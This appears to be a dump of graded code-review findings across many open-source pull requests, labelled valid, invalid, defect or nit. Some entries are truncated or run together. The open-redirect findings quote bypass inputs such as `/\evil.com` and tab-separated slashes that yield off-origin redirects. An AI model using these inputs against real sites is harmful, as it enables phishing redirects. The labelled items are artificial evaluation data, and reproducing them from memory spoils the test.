Suggestion: Read `h2Options?.settings?.initialWindowSize ?? initialWindowSize ?? 262144`, and merge `h2Options.settings` into the `settings` object passed to `http2.connect` in `connectH2`.

findings.title: Legacy options are unvalidated when h2Options is present, and when allowH2 is false
findings.body:
Validation is now skipped when `allowH2 === false`, which is a behavior change: invalid `maxConcurrentStreams` and similar values used to throw regardless. When `h2Options` is provided, the top-level legacy options are not validated at all, yet lines 324-334 still fall back to them (e.g. `h2Options?.pingInterval ?? pingInterval`). An invalid `pingInterval: -5` combined with `h2Options: {}` reaches `setInterval` and the session unchecked.

Suggestion: Validate each effective value after resolving `h2Options.x ?? legacyX`, and keep validation independent of `allowH2`.

findings.title: Deprecation warning is emitted only for invalid values, immediately before throwing
findings.body:
`emitH2OptionsNamespaceWarning` is called inside the `if (invalid)` branch, just before the throw. Users who pass valid deprecated options never see a warning, so the deprecation is ineffective. Users who pass invalid values get a deprecation warning alongside an unrelated validation error. The module-level flag also means only the first option name is ever reported.

Suggestion: Emit the warning when the deprecated option is present (`useH2c != null`, etc.), independent of validity. Validate separately.

findings.title: client[kMaxConcurrentStreams] is no longer initialized
findings.body:
The assignment to `this[kMaxConcurrentStreams]` was removed, but `kMaxConcurrentStreams` is still imported in client.js and client-h2.js. The dispatch ceiling logic for h2 (`getPipelining`/the server-confirmed ceiling) appears to depend on it. Unless every reader was migrated, it is now `undefined` until the server's SETTINGS frame arrives, which can break the ceiling comparison.

Suggestion: Keep `this[kMaxConcurrentStreams]` initialized from the resolved value, or migrate every reader to `kHTTP2Options.maxConcurrentStreams`.

findings.title: Omit on possibly-undefined type collapses `settings` to `{}`
findings.body:
`SessionOptions['settings']` is `Settings | undefined` because the property is optional. `keyof (Settings | undefined)` is `never` under strictNullChecks, so `Omit<...>` resolves to `{}`. The result is that `settings` accepts any object, including typos like `{ initialWindowSze: 1 }` or `{ enablePush: true }`, and gives no autocomplete. The type test passes only because `{}` accepts anything. The excluded keys (`enablePush`, `maxConcurrentStreams`, `enableConnectProtocol`) are therefore not actually forbidden.

Suggestion: settings?: Omit<NonNullable<SessionOptions['settings']>, 'enablePush' | 'maxConcurrentStreams' | 'enableConnectProtocol'>

The `maxConcurrentStreams` deprecation says 'use h2Options.useH2c instead', but the replacement is `h2Options.maxConcurrentStreams`. The top-level `initialWindowSize` entry was removed from the docs although it is still supported. The nested `useH2c` bullet is also mis-indented.

Suggestion: `_Deprecated: use h2Options.maxConcurrentStreams instead_`, and document `initialWindowSize` as deprecated in favor of its new location.

findings.title: Joining raw pathnames with ',' is ambiguous
findings.body:
Discovered paths are taken from link pathnames, which can contain literal commas. Joining them with `,` without escaping each path makes the server-side split lossy. Routes whose URL contains a comma will silently fail lazy discovery.

Suggestion: searchParams.set("paths", paths.sort().map(encodeURIComponent).join(","));
findings.label: defect:d1

findings.title: Same comma ambiguity in RSC manifest URL
findings.body:
RSC builds the manifest URL the same way, joining raw pathnames with `,`. Any pathname containing a comma will be split incorrectly by `generateManifestResponse`.

Suggestion: Escape each path before joining and decode after splitting on the server.
findings.label: defect:d2

findings.title: RSC server splits on comma without decoding; legacy `p` ignored
findings.body:
`split(',')` breaks any pathname that contains a comma. In addition, a request that still uses the old `p` params no longer reads them. It falls back to the `.manifest` pathname instead, so the manifest returned does not cover the requested paths.

Suggestion: Split and decode escaped segments. Optionally keep a fallback to `url.searchParams.getAll('p')` for one release.
findings.label: valid

findings.title: Comma delimiter corrupts paths that contain commas
findings.body:
Commas are valid, unencoded characters in URL pathnames (e.g. `/tags/a,b` or `/items/1,2,3`). The client joins the pathnames with `,`, and here the server splits on `,`. A path like `/products/red,blue` becomes `/products/red` and `blue`, and `blue` is then normalized to `/blue`. The real route is never matched, so no patch is returned, and client-side navigation to that URL falls through to a 404 or error boundary. The old repeated `p` param had no such ambiguity.

Suggestion: Encode each path before joining, e.g. `paths.map(encodeURIComponent).join(',')`, and on the server do `split(',').map(decodeURIComponent)`. Alternatively, use a delimiter that cannot appear in a pathname.
findings.label: valid

findings.title: Dropped support for legacy `p` param breaks mixed-version clients
findings.body:
The server now only checks `paths`. Any client still sending `p` gets an empty patch set and lazy route discovery silently fails. Examples are a custom client, a cached older bundle, or a proxy or custom manifest endpoint built against the old format. This is a wire-protocol change shipped as a patch release.

Suggestion: Accept both formats for a transition period: `url.searchParams.has('paths') || url.searchParams.has('p')`, then merge `getAll('p')` with the split `paths` values.
findings.label: invalid

findings.title: Comma Path Splitting
findings.body:
The server splits the `paths` value on `,`, but commas are valid, unencoded characters in URL pathnames. `location.pathname` keeps commas as-is, for example `/tags/a,b` or `/products/1,2`. On the client, `paths.join(",")` turns `/tags/a,b` into the same string as the two paths `/tags/a` and `b`. The server then requests patches for the wrong paths, so the route is never discovered and the navigation 404s.

Previously, repeated `p` params handled these paths correctly. To fix this, encode each path before joining (for example with `encodeURIComponent`) and decode each entry after splitting. Alternatively, use a delimiter that cannot appear in a pathname.

findings.title: Escape commas inside joined path values
findings.body:
URL pathnames can contain literal commas (for example `/a,b`), and the server splits on `,`, so such a path would be requested as `/a` and `b`. The route would then not be discovered correctly. findings.title: Comma delimiter is ambiguous for paths that contain commas
findings.body:
Commas are valid in URL pathnames (e.g. `/products/a,b`, or splat/param values). The client joins raw paths with `,`. The server calls `searchParams.get`, which decodes `%2C` back to `,`, and then splits on every comma. A path like `/products/a,b` therefore becomes `/products/a` and `/b`. The server then matches the wrong routes, or none, and returns incorrect or missing patches. A `/b` fragment can also match unrelated routes. Navigation to such URLs can fail to discover the right route, or the client can receive patches for routes it never requested. The old repeated-`p` format had no such ambiguity.

Suggestion: Escape commas in each path before joining, and unescape on the server after splitting, e.g. `paths.sort().map(p => p.replace(/,/g, '%2C')).join(',')` on the client and `.split(',').map(p => p.replace(/%2C/gi, ','))` on the server. Apply the same change in rsc/browser.tsx, server.rsc.ts and server.ts.
findings.label: defect:d1

Suggestion: Use the same comma escape/unescape scheme as the other call sites, and sort a copy: `[...paths].sort()`.

findings.title: End-tag regexes reject `{%endcomment%}` / `{%endverbatim%}`
findings.body:
`_comment_end_re` and `_verbatim_end_re` use `[^\S\n]+` after `{%`, so at least one space is required. Previously the content was stripped and compared to `endcomment`/`endverbatim`, so the no-space forms closed the block. Now `{% comment %}...{%endcomment%}` and `{% verbatim %}...{%endverbatim%}` never find their end tag. The rest of the template becomes one TEXT token and raises an unclosed-tag TemplateSyntaxError, breaking existing templates. The named-verbatim regex built at line 447 uses `*`, which is inconsistent with these.

Suggestion: Use `[^\S\n]*` after BLOCK_TAG_START in both regexes, matching the named-verbatim pattern and the old stripped-content semantics.
findings.label: defect:d1

findings.title: Verbatim handling lost when the opening tag has no space after `{%`
findings.body:
`_raw_start_re` requires `\s+` after `{%`, so a template like `{%verbatim%}{{ x }}{%endverbatim%}` takes the `tag_re.split` fast path. `create_token` no longer tracks verbatim state, so `{{ x }}` becomes a VAR token. The verbatim tag renders its nodelist with an empty Context and outputs `""` instead of the literal `{{ x }}`. The old lexer stripped the content and recognised `{%verbatim%}`. Behaviour now also depends on unrelated content: if any spaced `{% comment %}` appears elsewhere, the slow path is used and `_raw_end_tag_re` (which strips) does treat the same tag as raw.

Suggestion: Make the pre-check consistent with `_raw_end_tag_re`, e.g. `re.compile(r"%s\s*(?:comment|verbatim)\b" % re.escape(BLOCK_TAG_START))`, so every raw opening tag routes to the raw-aware splitter.
findings.label: valid

findings.title: Raw-block end search ignores tag boundaries
findings.body:
Inside a raw block, the end regex is searched anywhere in the text. An `{% endcomment %}` substring embedded inside another tag-like construct (e.g. `{{ "{% endcomment %}" }}` inside a comment) now closes the block early. Previously `tag_re` would have consumed it as part of a larger token. This silently changes how existing comment blocks are parsed.

Suggestion: Document the new semantics, or at least add tests that pin this behaviour so it is intentional.
findings.label: valid

findings.title: Closing-tag regression
findings.body:
`_comment_end_re` and `_verbatim_end_re` use `[^\S\n]+`, which requires at least one whitespace character after `{%`. The old lexer compared the stripped tag content, so `{% verbatim %}x{%endverbatim%}` and `{% comment %}x{%endcomment%}` both worked.

With this change, the raw-aware splitter never finds the closing tag. The rest of the template becomes a single text token, and the parser raises an "unclosed tag" `TemplateSyntaxError`.

The behavior is also inconsistent within the PR. The opening tag is detected after `strip()`, so `{%verbatim%}` and `{%comment%}` open a raw block. The named-verbatim end regex uses `[^\S\n]*`, so it accepts `{%endverbatim name%}`. Using `*` instead of `+` in these two regexes would restore the old behavior.
findings.label: defect:d1

findings.title: Inconsistent raw detection
findings.body:
`_raw_start_re` requires whitespace after `{%` (`\s+`), but `_raw_end_tag_re` strips the content and also treats `{%comment%}` and `{%verbatim%}` as raw openers. As a result, the same template tokenizes differently depending on whether some other `{% comment ...` or `{% verbatim ...` with a space appears elsewhere.

Example: `{%comment%}{{ x }}{%endcomment%}` works on the fast path when it is the only raw tag. If the template also contains `{% verbatim %}...{% endverbatim %}`, it goes through `_tag_re_split` instead. There the `{%comment%}` block enters raw mode and cannot be closed, because of the whitespace requirement in the end regex.

The fast-path check should accept optional whitespace (`\s*`) so it matches what `_raw_end_tag_re` accepts.
findings.label: defect:d1

findings.title: Allow closing tags without inner whitespace
findings.body:
The closing-tag regexes require at least one space after `{%`, so `{%endcomment%}` and `{%endverbatim%}` no longer close their blocks. Both were valid before, because the content is stripped and compared. Without a match, the rest of the template is swallowed as text and parsing fails with an unclosed-tag error. Use `*` instead of `+`, matching the named-verbatim regex.

Improved code:
_comment_end_re = re.compile(
    r"%s[^\S\n]*endcomment[^\S\n]*%s"
    % (re.escape(BLOCK_TAG_START), re.escape(BLOCK_TAG_END))
)
_verbatim_end_re = re.compile(
    r"%s[^\S\n]*endverbatim[^\S\n]*%s"
    % (re.escape(BLOCK_TAG_START), re.escape(BLOCK_TAG_END))
)

findings.title: Breaks async views
findings.body:
The new `wrapper` is always a plain sync function. When `non_atomic_requests` decorates an `async def` view, `iscoroutinefunction(wrapper)` returns False. Django's handler then treats the view as sync. When `iscoroutinefunction(view)` is true, the decorator should define an `async def` wrapper that awaits the view. Alternatively, it can mark the wrapper with `markcoroutinefunction`. Adding a test with an async view would catch this.

findings.body:
The new guard only covers Series and 1-D-selected GroupBy. findings.title: Restore test* subdir scan for the invocation_dir fallback
findings.body:
Previously, when no argument resolved to an existing anchor, `_try_load_conftest(invocation_dir, ...)` loaded `invocation_dir` and also every `invocation_dir/test*` directory. Now the fallback is just `anchors = [invocation_dir]`, and the `test*` glob only runs for anchors found in `args`.

The common case is running plain `pytest` from the repo root with no positional args (or with args that don't resolve to existing paths). In that case `tests/conftest.py` is no longer loaded as an initial conftest. Its `pytest_addoption` hooks are then not registered before command-line parsing, so custom options like `pytest --myopt` fail with "unrecognized arguments". Early hooks such as `pytest_load_initial_conftests` and `pytest_configure` registered there also run late or not at all.

Suggestion: Apply the subdir expansion uniformly, e.g.:

```python
if not anchors:
    anchors = [invocation_dir]

expanded = []
for anchor in anchors:
    expanded.append(anchor)
    # Let's also consider test* subdirs.
    if anchor.is_dir():
        expanded.extend(x for x in anchor.glob("test*") if x.is_dir())

for anchor in expanded:
    self._loadconftestmodules(anchor, importmode, rootpath,
                              consider_namespace_packages=consider_namespace_packages)
```

Then remove the glob from the per-arg loop.

findings.title: Forced plain-ndarray `out=` breaks subclass and `__array_ufunc__` propagation
findings.body:
`start` and `stop` come from `asanyarray`, so subclasses such as MaskedArray and unit-carrying `__array_ufunc__` overriders reach this code. Previously `delta = np.subtract(stop, start, ...)` let the subclass control the result type. That type then propagated through `y * delta + start`.

Now every non-0-d input writes into `np.zeros(...)`, a base ndarray. This has three consequences:
- Subclass overriders that require `out` to be their own type (e.g. unit-aware arrays) will raise or misbehave.
- MaskedArray masks on `delta` are silently dropped.
- The `where=` mask is itself a subclass instance (`~equal`), which some overriders reject.

The new branch also depends on `start == stop` returning something with `.ndim` and a usable `~`. An `__eq__` override that returns a Python bool or `NotImplemented` would raise `AttributeError` where the old code worked.

All of this is applied to every non-scalar call, including the overwhelmingly common case where no endpoints are equal.

Suggestion: Keep the original subtraction as the default path and patch only the equal elements afterwards, letting the subclass decide the output type:

```python
with np.errstate(invalid='ignore'):  # or compute only where needed
    delta = np.subtract(stop, start, dtype=type(dt))
equal = np.asanyarray(start == stop)
if equal.any():
    delta = np.where(equal, 0, delta)  # or delta[equal] = 0 on an ndarray copy
```

Alternatively, build `out` with `np.zeros_like(np.broadcast_to(...), subok=True)` so the subclass type is preserved.
findings.label: defect:d1

findings.title: Avoid unconditional plain-array output allocation
findings.body:
The array branch always writes into a freshly allocated plain `np.zeros` buffer, even when no endpoints are equal. This silently drops array subclasses and their extra state, such as masks or units, that the original `np.subtract(stop, start, ...)` preserved, so `linspace` can behave differently for subclass inputs. Use the original subtraction unless some elements are actually equal, and use the `where=` path only in that case.

Improved code:
equal = start == stop
if equal.ndim == 0:
    delta = dt.type(0) if equal else np.subtract(
        stop, start, dtype=type(dt))
elif not equal.any():
    delta = np.subtract(stop, start, dtype=type(dt))
else:
    delta = np.subtract(stop, start, dtype=type(dt), where=~equal,
                        out=np.zeros(equal.shape, dtype=type(dt)))
findings.label: defect:d1

findings.title: Collapse happens before relative-path '/' prefixing; backslash targets bypass it
findings.body:
RedirectRule matches against the path with its leading '/' stripped. Later it prepends '/' (plus PathBase) when `newPath` doesn't start with '/'. With `AddRedirect("(.*)", "$1")` and request `/\example.com`, `newPath` is `\example.com`. Collapse leaves it unchanged (first char isn't '/'), and the prefixing step yields `Location: /\example.com`, a scheme-relative redirect to an external host. The tests only cover replacements with a literal leading '/', so they miss this.

Suggestion: Apply CollapseLeadingSlashes to the final path after the '/' is prepended, and before PathBase is added. Alternatively, have the normalizer treat any leading run of '/' or '\\' (starting at index 0) as collapsible. Add a test for replacement "$1" with request "/\\example.com".
findings.label: valid

findings.title: Normalize after the leading '/' is prepended, not before
findings.label: valid

findings.title: Rewrite normalization is incomplete and changes routing semantics
findings.body:
As with the redirect paths, the collapse runs before the '/' is prepended to relative patterns further down, so `\host` patterns still become `/\host` in `Request.Path`; the defense-in-depth goal isn't met. Separately, unconditionally collapsing `//`/`/\` in internal rewrites is a behavior change for apps that intentionally route on paths with empty segments. Such rewrites now silently land on a different endpoint, with no opt-out.

Suggestion: Move the collapse to after the '/' prefixing, and consider limiting it to redirect actions (where the Location header is the real risk) or gating it behind an option.
findings.label: valid

findings.title: Normalization bypass
findings.body:
`CollapseLeadingSlashes` runs before the code that prepends `/` to relative patterns, and it only acts when the string already starts with `/`. A pattern that starts with a backslash skips normalization, then gets `/` prepended, which recreates the scheme-relative shape.

Example: the IIS rule `url="{R:1}"` with a capture of `\example.com` (or `\\example.com`) becomes `/\example.com`. Browsers treat that as `//example.com`, so the open redirect still works. The same applies to Apache rules like `RewriteRule /legacy/(.*) $1 [R=302]`.

Fix: normalize after the leading `/` is prepended, or make the helper also collapse a leading run that begins with `\`. Add test cases where the target has no leading `/` and the capture starts with `\`.
findings.label: valid

notes: Open redirect: the new mitigation is incomplete for `RedirectAction`. A back-reference that starts with `\` passes through `CollapseLeadingSlashes` unchanged, then has `/` prepended. This produces a `Location` such as `/\evil.com`, which browsers resolve off-origin when `PathBase` is empty.

findings.title: Collapsing leading slashes in rewrites silently changes behavior for legitimate paths
findings.body:
RewriteAction does not emit a Location header. The code comment itself says this change is only defense in depth against a hypothetical downstream redirect. It now rewrites any path that begins with `//` or `/\` to a single-slash path. A rewrite that deliberately targets a route with an empty first segment, or a path that preserves a double slash, is changed without any opt-out. This also runs before the `://` check, so the semantics differ from IIS and mod_rewrite. The guard belongs at the redirect sink, not in a generic path rewrite.

Suggestion: Drop the normalization from RewriteAction and rely on the redirect-emitting code paths. Alternatively, make it opt-in and document it as a breaking change.
findings.label: nit

findings.title: Normalizer ignores targets that start with a backslash or have control characters before the second slash
findings.body:
The early return requires url[0] == '/'. Inputs such as `\\example.com` or `\/example.com` pass through untouched. In RedirectRule, `newPath` comes straight from the regex replacement and is not guaranteed to start with '/', so the same bypass applies there if the value reaches the Location header as-is. Browsers also strip tab characters, so `/\t/example.com` resolves like `//example.com`, and the helper does not handle it. The helper's guarantee is narrower than its comment claims.

Suggestion: Treat '/' and '\\' symmetrically at index 0. Normalize any leading run of '/' and '\\' to a single '/' when the string is meant to be a path. Consider rejecting or stripping tab, CR and LF characters.
findings.label: defect:d1

findings.title: Incomplete Normalization
findings.body: `CollapseLeadingSlashes` returns the input unchanged unless `url[0] == '/'`. The PR description says "any leading run of `/` and `\`" is collapsed, and the callers prepend `/` afterwards when the target doesn't start with `/`. A target such as `\\example.com` or `\/example.com` therefore passes through untouched, because it starts with `\`. The caller then prepends `/`, producing `/\\example.com` or `/\/example.com`. Browsers treat `\` as `/`, so this is again a scheme-relative off-origin redirect, which is exactly the open redirect this PR targets. Collapsing should also handle a leading `\` (and mixed runs), or run after the `/` prepend.

findings.title: End-anchoring uses stale Bounds and fires in unintended states
findings.body:
`Bounds` is the size from the last arrange, not the current estimated extent. Several situations trigger the shortcut incorrectly:
- On the first measure, `Bounds` is 0x0, so any non-negative viewport end satisfies `GreaterThanOrClose`. The panel then anchors at `itemCount - 1` with a position of `viewportEnd - estimate`, instead of starting at item 0.
- When the panel is not constrained by a ScrollViewer, the viewport can be infinite or larger than the content. `viewportEnd - EstimateElementSizeU()` then yields Infinity, or a position far from where the last item really sits.
- When the content is shorter than the viewport, every measure re-anchors at the last element.
The result is a wrong first realized index, shifted StartU, and possible NaN/Infinity propagation into element positions.

Suggestion: Only take this path when the viewport is finite and the panel has been arranged at least once (for example `!double.IsInfinity(viewportEnd) && Bounds.Height/Width > 0`). Compare against the estimated extent (`items.Count` × estimate, or the extent computed from realized elements) rather than `Bounds`. Ideally trigger it only from an explicit scroll-to-end request, such as an offset at max or a NegativeInfinity/PositiveInfinity request.
findings.label: invalid

findings.title: Collection or size changes while at the end silently jump to the new last item
findings.body:
Appending items while the user is scrolled to the bottom can trigger this path, because `viewportEnd >= Bounds` still holds from the old layout and `_hasReachedEnd` is reset. Removing items or shrinking the extent can do the same. The anchor then becomes the new `items.Count - 1`, pinned at the viewport end. Previously the visible items stayed put. Now the viewport content is replaced by the tail of the list, which effectively adds an unrequested 'stick to bottom' behavior. It also overrides `viewport.anchorU`, which can make the computed extent and offset inconsistent and cause visible jumps.

Suggestion: Decouple this from layout geometry. Record an explicit 'scroll to end requested' flag when the offset is set to its maximum or to infinity, and only then apply the end anchoring. Clear the flag once the end has been realized.
findings.label: invalid

findings.title: Stale Bounds check
findings.body:
The new "anchor at end" shortcut compares the current viewport end with `Bounds.Width`/`Bounds.Height`. During measure, `Bounds` still holds the previous arrange size, so the panel compares against the old extent.

Example scenario:
- The items source is replaced or grows a lot (say 100 → 1000 items) while the viewport sits at the old end.
- `_hasReachedEnd` is false at that point.
- `viewportEnd >= oldBounds` passes, so the anchor jumps to `itemCount - 1`.
- The scroll position snaps to the end of the new list instead of keeping the current offset.

The same stale comparison feeds `anchorAtEnd` in `RealizeElements`.

Uncertain: whether `_hasReachedEnd` is always still true in these reset or growth paths. If it is, the shortcut is skipped.

Possible fix: base the condition on the estimated or known extent for the current item count rather than the last arranged `Bounds`.

findings.title: End-anchor shortcut can trigger on default/zero viewport and bounds
findings.body:
The new check `GreaterThanOrClose(viewportEnd, Bounds.Width/Height)` has no guard for a not-yet-arranged panel. Before the first arrange, `_viewport` is default (Bottom/Right = 0) and `Bounds` is zero, so 0 >= 0 holds and `_hasReachedEnd` is false. The panel then anchors at the last item at `0 - estimatedSize`, instead of starting from the first item. The same happens whenever the viewport is empty or the panel is collapsed. A list that should open at the top can start realizing from the end, or produce a negative anchor position. The check also depends on `Bounds`, which is the previously arranged size and may differ from the estimated extent, for example when the panel is stretched to fill a viewport larger than its content.

Suggestion: Guard the shortcut so it only applies to a real, non-empty viewport that has been scrolled past the start, for example: `_viewport.Height > 0 && viewportEnd > 0 && _viewport.Y > 0 && ...`. Alternatively compare against the panel's own extent/estimate rather than `Bounds`.

findings.title: Anchor offset may become negative and is not clamped
findings.body:
`u = viewportEnd - sizeU` is applied without clamping. If the last item is larger than the viewport end (small viewport, or a tall last item), `u` goes negative and the item is placed before the panel origin. Because `_hasReachedEnd` is only set later, this can leave the extent and offset inconsistent. The `index == viewport.anchorIndex` test is also redundant with the `anchorAtEnd` check, since `anchorAtEnd` already requires the anchor to be the last item.

Suggestion: Use `u = Math.Max(0, viewportEnd - sizeU);` and drop the redundant index comparison.

findings.body:

Suggestion: Use `Assert.Equal(expected, actual, 3)` or a precision/tolerance overload.

findings.title: Pointer popups no longer get edge constraints after resize
findings.body:
After the first placement, every size-driven reposition is suppressed for `Placement == Pointer`. `UpdatePosition` is also where the positioner applies constraint adjustment (flip/slide) to keep the popup on screen. A context menu or flyout that grows after opening will now spill off the screen or monitor edge instead of being slid or flipped back into view. The intent is to keep the anchor point, but the fix should keep the anchor (the original pointer position) rather than skip positioning entirely.

Suggestion: Capture the pointer anchor once in ConfigurePosition and keep calling UpdatePosition on resize, so constraint adjustment still runs. Alternatively, skip repositioning only when the new bounds still fit within the screen work area.
findings.label: valid

findings.title: Flag is not reset when a new position request is configured
findings.body:
`_hasInitialPosition` is cleared only in `Dispose`. If the same PopupRoot gets a new `ConfigurePosition` call while alive (for example, the flyout is shown again at a new pointer location, or placement changes), the flag stays true. A later reposition through `ArrangeSetBounds` is then suppressed, and the popup can stay at a stale location. The flag belongs to the position request, not the root's lifetime.

Suggestion: Reset `_hasInitialPosition = false` wherever `_popupPositionRequest` is assigned (ConfigurePosition), not only in Dispose.
findings.label: invalid

findings.title: Popup Can Go Off-Screen
findings.body:
In `Pointer` mode, once `_hasInitialPosition` is set, later size changes no longer reach the positioner. The positioner's constraint adjustments (flip/slide to stay inside screen bounds) are therefore never re-applied.

Scenario: a context flyout opens near the bottom or right screen edge, then its content grows (async items load, an expander opens). The popup keeps its original anchor and its new area extends off-screen.

The first arrange may also run before content reaches its final size. That locks in a position computed for a smaller popup.

Consider still repositioning when the new bounds would violate screen constraints, or re-running only the constraint adjustment with the original anchor point.
findings.label: valid

findings.title: Cache lack of PIDFD_NONBLOCK support (EINVAL), not only ENOSYS
findings.body:
Kernels 5.3–5.9 support `pidfd_open` but reject `PIDFD_NONBLOCK` with EINVAL. Only ENOSYS is cached in `NO_PIDFD_SUPPORT`. On those kernels every spawn issues a doomed syscall before falling back to the signal reaper. Other errors (EMFILE, EPERM from seccomp) are also silently swallowed, which hides fd exhaustion.

Suggestion: Also set `NO_PIDFD_SUPPORT` on EINVAL. Consider propagating resource errors such as EMFILE/ENFILE instead of silently falling back.

Any change to how that error is constructed (e.g. wrapping, different message, a custom error type) silently breaks the cross-runtime re-registration path. `wait()` would then return an error instead of re-registering.

Suggestion: Expose a typed or crate-internal marker for the runtime-shutdown error, or have `Registration` return a dedicated internal error variant that can be matched structurally.

findings.title: Child dropped without reaping when pidfd registration fails
findings.body:
If `PollEvented::new_with_interest` fails, `PidfdReaper::new` returns `(Some(err), child)`. The code discards `_child`, so the already-spawned process is dropped without `wait` or being pushed to the orphan queue. Its stdio handles were already taken, and the process is left as a zombie until the parent exits. The error is also mixed with the 'no pidfd support' signal through `Option`, which makes the contract fragile.

Suggestion: Push the returned child to the orphan queue (`GlobalOrphanQueue.push_orphan(child)`) before returning the error, or fall back to the signal reaper instead of failing.

findings.title: Inverted build-data/proc-macro readiness check disables semantic diagnostics
findings.body:
The comment says semantic diagnostics should be fetched only after build data and proc-macros have finished loading once. The code does the opposite: it requires `last_op_result().is_none()`, meaning the operation has never completed.

Once the first build-data fetch completes, `last_op_result()` becomes `Some` and stays that way. From then on `fetch_semantic` is permanently false whenever build scripts or proc-macros are enabled, which is the default configuration. Users would lose all semantic diagnostics after startup.

Before that first completion, diagnostics are fetched only in the window before the fetch starts. That is exactly the state with incomplete data that the comment tries to avoid.

Suggestion: let fetch_semantic = self.vfs_done
    && self.fetch_workspaces_queue.last_op_result().is_some()
    && (!self.config.run_build_scripts(None)
        || self.fetch_build_data_queue.last_op_result().is_some())
    && (!self.config.expand_proc_macros()
        || self.fetch_proc_macros_queue.last_op_result().is_some());
findings.label: defect:d1

findings.title: DefaultRetry backoff is too short for quota contention
findings.body:
`retry.DefaultRetry` is 5 steps of about 10ms each (factor 1.0). That gives a total window of roughly 50ms. When many objects are created concurrently in a namespace with a ResourceQuota (the scenario in kubernetes/kubernetes#67761), contention on the quota object can easily outlast that window. Installs will then still fail intermittently.

Suggestion: Use a backoff with exponential growth and a longer total window, e.g. wait.Backoff{Steps: 5, Duration: 100 * time.Millisecond, Factor: 2.0, Jitter: 0.1}.

findings.title: Detect quota conflicts from structured status details instead of message text
findings.body:
`isResourceQuotaConflict` decides retryability by substring-matching two English phrases in `err.Error()`. The text comes from the apiserver's `NewConflict` formatting, so any wording change, or a different wrapping layer, silently disables the retry.

The same information is available in structured form: the `StatusError` carries `Status().Details.Kind == "resourcequotas"` (and `Group == ""`). The error is wrapped with `%w` in `patchResourceServerSide`, so `errors.As` can reach the `*apierrors.StatusError`.

Suggestion: var statusErr *apierrors.StatusError
if !errors.As(err, &statusErr) || !apierrors.IsConflict(err) {
	return false
}
d := statusErr.Status().Details
return d != nil && d.Kind == "resourcequotas"

In that case the same conflict still surfaces to the user after a burst of rapid-fire PATCH requests, which also adds load on the API server. The helper is unrelated to the actual quota controller's reconciliation time.

findings.title: Silent downgrade from DoH to plaintext DNS for existing Control D ID-encoded resolvers
findings.body:
Users who configured Control D ID-encoded IPv6 resolvers previously had their queries upgraded to DoH. Those queries now go out unencrypted on port 53, with no log, warning or opt-out. If the premium resolvers do serve DoH on some paths, this removes the encryption and can expose the customer's DNS traffic. The new comment also states that premium DoH is only reachable via the dns.controld.com/<id> URL path (DoHIPsOfBase). That is not verified here, and DoHIPsOfBase is not part of this change. If DoHIPsOfBase still maps those URLs to ID-encoded IPs and relies on this reverse mapping, the round trip is now asymmetric.

Suggestion: Confirm with Control D that these addresses refuse DoH on :443. Then either log or document the behavior change, or fall back to plaintext only after a DoH failure instead of removing the upgrade outright. Also check that controlDv6RangeA/B and controlDBase are still used, and delete them if they are now dead.
